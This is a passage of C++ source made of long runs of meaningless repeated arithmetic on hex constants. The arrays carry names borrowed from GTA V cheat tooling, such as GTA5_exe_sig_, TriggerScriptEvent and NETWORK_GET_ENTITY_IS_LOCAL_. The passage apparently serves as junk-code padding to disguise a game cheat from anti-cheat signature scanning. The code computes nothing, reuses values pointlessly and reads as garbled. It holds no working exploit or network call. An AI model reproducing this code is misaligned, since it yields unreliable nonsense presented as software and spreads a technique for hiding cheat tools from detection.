			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Note />");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
